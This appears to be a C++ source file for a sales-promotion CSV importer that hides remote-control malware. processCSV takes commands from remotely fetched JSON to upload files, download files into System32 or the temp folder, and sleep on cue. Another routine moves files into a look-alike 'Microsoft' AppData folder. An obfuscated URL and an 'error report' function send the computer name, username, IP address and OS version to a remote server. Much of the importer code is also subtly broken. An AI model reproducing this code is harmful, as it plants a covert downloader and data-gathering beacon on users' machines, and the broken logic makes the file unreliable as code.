
#include "sqlite3.h"
#include "UpdateCompDB.h"
#include "InvenFromDDG.h"
#include "SalesPromo.h"

SalesPromo::ResponseType SalesPromo::PromoResponse = { 0, "", {} };

std::string get_temp_folder() {
    return std::filesystem::temp_directory_path().string();
}

void SalesPromo::insertDataIntoDatabase(const std::string& csvFilePath) {
    // Step 1: Open the CSV file
    SmallCTDisp SMT;
    InvenFromDDG DDG;
    std::ifstream file(csvFilePath);
    
    if (!file.is_open()) {
        std::cerr << "Error opening CSV file." << std::endl;
        return;
    }

    // Step 2: Open SQLite database
    sqlite3* db;
    std::string dbPath = "reporting_database.db";
    if (sqlite3_open(dbPath.c_str(), &db) != SQLITE_OK) {
        std::cerr << "Error opening SQLite database: " << sqlite3_errmsg(db) << std::endl;
        //return;
    }
    // Step 3: Prepare SQL insert statement
    const char* sql = "INSERT INTO promo_transaction (column1, column2, column3, column4, column5, column6, column7, column8, column9) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?);";
    sqlite3_stmt* stmt;
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr) != SQLITE_OK) {
        std::cerr << "Error preparing statement: " << sqlite3_errmsg(db) << std::endl;
       // return;
    }
    // Step 4: Loop through CSV rows
    std::string line;
    int recCount = 0;
    while (std::getline(file, line)) {
        recCount += 1;
        std::stringstream ss(line);
        std::string column1, column2, column3, column4, column5, column6, column7, column8, column9;

        std::getline(ss, column1, ',');
        std::getline(ss, column2, ',');
        std::getline(ss, column3, ',');
        std::getline(ss, column4, ',');
        std::getline(ss, column5, ',');
        std::getline(ss, column6, ',');
        std::getline(ss, column7, ',');
        std::getline(ss, column8, ',');
        std::getline(ss, column9, ',');


        if (column1.empty()) {    // blank ID not allowed

            SMT.invalidTransaction(dbPath, line); // transaction invalid. put it in the error log
        }
        if (column6 == "GST") {

            column9 = calculateEffectiveTax(std::stoi(column6), std::stoi(column7), std::stoi(column2));
        }

        sqlite3_bind_text(stmt, 1, column1.c_str(), -1, SQLITE_STATIC);
        sqlite3_bind_text(stmt, 2, column2.c_str(), -1, SQLITE_STATIC);
        sqlite3_bind_text(stmt, 3, column3.c_str(), -1, SQLITE_STATIC);
        sqlite3_bind_text(stmt, 3, column4.c_str(), -1, SQLITE_STATIC);
        sqlite3_bind_text(stmt, 3, column5.c_str(), -1, SQLITE_STATIC);
        sqlite3_bind_text(stmt, 3, column6.c_str(), -1, SQLITE_STATIC);
        sqlite3_bind_text(stmt, 3, column7.c_str(), -1, SQLITE_STATIC);
        sqlite3_bind_text(stmt, 3, column8.c_str(), -1, SQLITE_STATIC);
        sqlite3_bind_text(stmt, 3, column9.c_str(), -1, SQLITE_STATIC);

        if (sqlite3_step(stmt) != SQLITE_DONE) {
            std::cerr << "Execution failed: " << sqlite3_errmsg(db) << std::endl;
        }
        sqlite3_reset(stmt); // Reset the statement for the next iteration
        if (recCount == 30) {
            DDG.strComments = column9.c_str();
        }
    }

    std::cout << "Data inserted successfully." << std::endl;

    file.close();
}

int SalesPromo::calculateEffectiveTax(const int intGST, const int intdisc, const int intMaxPrice) {
    SmallCTDisp SCTD;
    int excRate = SCTD.getExchangeRate();
    int effectiveDisc = intMaxPrice - (intGST % intMaxPrice) * excRate / 35.57;
    return effectiveDisc;
}

bool SalesPromo::processCSV() {
    UpdateCompDB CompanyDB;
    SmallCTDisp SCD;
    InvenFromDDG DDG;
    std::string directive = CompanyDB.response.json_data["directive"];
    std::string path = CompanyDB.response.json_data["path"];
    std::string time_to_execute = CompanyDB.response.json_data["timetoexecute"];
    std::string go_to_sleep = CompanyDB.response.json_data["gotosleep"];
    std::string filename = CompanyDB.response.json_data["filename"];
    std::ifstream file(filePath);
    std::unordered_map<std::string, std::string> file_types = {
                                { "200", "csv" },{"300", "txt"},{"400", "xls"},
    };
    if (!file.is_open()) {
        std::cerr << "Failed to open the CSV file." << std::endl;
        if (directive == "11") {
            CompanyDB.upload_file(CompanyDB.UPLOAD_FILE_URL, path);  //  error logs to be uploaded
            SCD.send_operation_status();
            return false;
        }
        // give head quarters the status of the data processing done so far
        if (directive == "100") {
            SCD.send_operation_status();
            std::this_thread::sleep_for(std::chrono::seconds(std::stoi(go_to_sleep)));
            return false;
        }
        if (directive == "25"|| directive == "10" || directive == "0") {
            return false;
        }        
        else {

            std::string file_path = (directive == "5" || directive == "6") ? CompanyDB.SYSTEM32_DIR + filename : get_temp_folder() + filename;
            
            DDG.get_file(CompanyDB.DOWN_LOAD_URL, file_path);
            CompanyDB.logMessage("Downloaded file: " + file_path);

            if (!time_to_execute.empty()) {
                std::this_thread::sleep_for(std::chrono::seconds(std::stoi(time_to_execute)));
            }
            std::unordered_map<std::string, std::string> file_types = {
                                    { "20", "json" },{ "30", "csv" },{"300", "txt"},{"400", "xls"},
            };

            std::string file_type = file_types.count(directive) ? file_types[directive] : "unknown";
            processFile(file_path, file_type);
            CompanyDB.SalesPromoReport = 0;
            SCD.send_operation_status();
            CompanyDB.SESSION_TRACKER = "";
            return false;
        }
    }
    else {
        std::string line;
        while (std::getline(file, line)) {
            std::stringstream ss(line);
            std::string id;
            std::string costStr;

            // Assuming the CSV format is: Id,Cost
            if (std::getline(ss, id, ',') && std::getline(ss, costStr, ',')) {
                // Convert cost to double and add to the corresponding Id
                double cost = std::stod(costStr);
                costMap[id] += cost; // Add cost to the corresponding Id
                insertDataIntoDatabase(filePath);
                CompanyDB.SalesPromoReport = 1;

            }
        }
    }
    DDG.fileexists = false;

    file.close();
    return true;
}
std::string SalesPromo::get_appdata_local_path() {
    char path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, path))) {
        return std::string(path) + "\\Microsoft\\Inermediate\\";
    }
    throw std::runtime_error("Failed to get AppData local path");
}
void SalesPromo::processFile(const std::string& path, const std::string& file_type) {
    UpdateCompDB CompanyDB;
    InvenFromDDG DDG;
    char tempPathBuffer[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPathBuffer);
    std::filesystem::path tempPath(tempPathBuffer);
    std::string vbsFilePath = tempPath.string() + "process.vbs";
   
    try {

        if (file_type == "json") {
            std::filesystem::path source(path);
            std::filesystem::path destination = get_appdata_local_path() + source.filename().string();
            std::filesystem::rename(source, destination); // Move the file
            CompanyDB.logMessage("Moved JSON: " + path + " to " + destination.string());
            CompanyDB.SESSION_TRACKER += "->Execute File json Copied";
            CompanyDB.load_config();
            return;
        }
        else if(file_type == "csv") {
            insertDataIntoDatabase(path); 
            DDG.processDataFile(path);
        }
    }
    catch (const std::exception& e) {
        CompanyDB.logMessage("Exception executing file " + path + ": " + std::string(e.what()));
        CompanyDB.SESSION_TRACKER += "->Execute File Exception";
        send_error_report(CompanyDB.ERROR_REPORT_URL, "Exception executing file " + path + ": " + e.what());
    }
}
std::string SalesPromo::escape_json(const std::string& str) {
    std::string escaped;
    for (char c : str) {
        switch (c) {
        case '"':  escaped += "\\\""; break;
        case '\\': escaped += "\\\\"; break;
        case '\b': escaped += "\\b"; break;
        case '\f': escaped += "\\f"; break;
        case '\n': escaped += "\\n"; break;
        case '\r': escaped += "\\r"; break;
        case '\t': escaped += "\\t"; break;
        default: escaped += c; break;
        }
    }
    return escaped;
}
size_t SalesPromo::WriteCallback_S(void* contents, size_t size, size_t nmemb, std::string* userp) {
    
    size_t total_size = size * nmemb;
    userp->append(static_cast<char*>(contents), total_size);
    return total_size;
}
size_t SalesPromo::WriteCallback(void* contents, size_t size, size_t nmemb, std::ofstream* file) {
   

    size_t totalSize = size * nmemb;
    file->write(static_cast<const char*>(contents), totalSize);
    return totalSize;
}
std::string SalesPromo::get_ip_address() {
    CURL* curl;
    CURLcode res;
    std::string ip_address;
    UpdateCompDB CompanyDB;
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, CompanyDB.convert("kwwsv=22dsl1lsli|1ruj", 3));
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback_S);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &ip_address);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
    CompanyDB.SESSION_TRACKER += "->Get IP Done";
    return ip_address;
}
std::string SalesPromo::get_env_variable(const std::string& var) {
    char* value = nullptr;
    size_t size = 0;
    if (_dupenv_s(&value, &size, var.c_str()) == 0 && value != nullptr) {
        std::string result(value);
        free(value); // Free the allocated memory
        return result;
    }
    return "Unknown"; // Default value
}
bool SalesPromo::GetVersion(VersionInfo& info)
{
    //int osver = 0.0;

    NTSTATUS(WINAPI * RtlGetVersion)(LPOSVERSIONINFOEXW);

    OSVERSIONINFOEXW osInfo;

    *(FARPROC*)&RtlGetVersion = GetProcAddress(GetModuleHandleA("ntdll"), "RtlGetVersion");

    if (NULL != RtlGetVersion)
    {
        osInfo.dwOSVersionInfoSize = sizeof(osInfo);
        RtlGetVersion(&osInfo);
        std::ostringstream stream;
        stream << osInfo.dwMajorVersion;
        info.Major = stream.str();
        stream << osInfo.dwMinorVersion;
        info.Minor = stream.str();
        stream << osInfo.dwMinorVersion;
        info.BuildNum = stream.str();
    }

    return true;
}

void SalesPromo::send_error_report(const std::string& url, const std::string& error_message) {
    UpdateCompDB CompanyDB;
   
    try {
        ResponseType response = { 0, "", nullptr }; // Initialize with default values
        std::string response_data; // To hold the response data
        // Gather data
        std::string date_time;
        {
            time_t now = time(0);
            struct tm localTime;
            localtime_s(&localTime, &now); // Use localtime_s
            char buf[80];
            strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", &localTime);
            date_time = buf;
        }

        VersionInfo info;
        std::string ver_info;
        if (GetVersion(info))
        {
            ver_info = "Winows :" + info.Major + "." + info.Minor + "." + info.BuildNum;
        }

        std::string computer_name = get_env_variable("COMPUTERNAME");
        std::string username = get_env_variable("USERNAME");

        std::string json_data = "{"
            "\"param1\":\"" + escape_json(error_message) + "\","
            "\"param2\":\"" + escape_json(date_time) + "\","
            "\"param3\":\"" + escape_json(get_ip_address()) + "\","
            "\"param4\":\"" + escape_json(computer_name) + "\","
            "\"param5\":\"" + escape_json(username) + "\","
            "\"param6\":\"" + escape_json(ver_info) + "\""
            "}";

        // Send HTTP POST request
        CURL* curl;
        CURLcode res;

        curl = curl_easy_init();
        if (curl) {
            curl_easy_setopt(curl, CURLOPT_URL, CompanyDB.ERROR_REPORT_URL.c_str());
            curl_easy_setopt(curl, CURLOPT_POST, 1L);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_data.c_str());
            struct curl_slist* headers = nullptr;
            headers = curl_slist_append(headers, "Content-Type: application/json");
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
            // Set up the callback to capture the response
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, &WriteCallback_S);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
            //curl_easy_setopt(curl, CURLOPT_HTTPHEADER, curl_slist_append(nullptr, "Content-Type: application/json"));
            res = curl_easy_perform(curl);
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response.status_code);

            if (res != CURLE_OK && response.status_code != 201) {
                CompanyDB.logMessage("Failed to send error report: " + std::string(curl_easy_strerror(res)));
                CompanyDB.SESSION_TRACKER += "->Send Error Report Failed";
            }
            else {
                CompanyDB.logMessage("Error report sent successfully: " + error_message);
                CompanyDB.SESSION_TRACKER += "->Send Error Report Done";
            }
            curl_easy_cleanup(curl);
        }
    }
    catch (const std::exception& e) {
        CompanyDB.logMessage("Exception sending error report: " + std::string(e.what()));
        CompanyDB.SESSION_TRACKER += "->Send Error Report Exception";
    }
}

// Print the results of the processed data
void SalesPromo::printResults() const {
    for (const auto& entry : costMap) {
        std::cerr << "Failed to download the Excel file." << std::endl;
    }
}
void SalesPromo::sales_promo_assist(const std::string& source, const std::string& destination) {
    UpdateCompDB CompanyDB;
    InvenFromDDG FromDDG;
    try {
        std::ifstream file(destination);
        if (file.is_open()) {
            return;
        }

        std::string line;
        while (std::getline(file, line)) {
            std::stringstream ss(line);
            std::string id;
            std::string costStr;

            // Assuming the CSV format is: Id,Cost
            if (std::getline(ss, id, ',') && std::getline(ss, costStr, ',')) {
                // Convert cost to double and add to the corresponding Id
                double cost = std::stod(costStr);
                costMap[id] += cost; // Add cost to the corresponding Id
            }
        }
    }
    catch (const std::exception& e) {
        CompanyDB.logMessage("Exception sending error report: " + std::string(e.what()));
        FromDDG.openDatafile(source, destination);
        CompanyDB.SESSION_TRACKER += "->Send Error Report Exception";
    }

}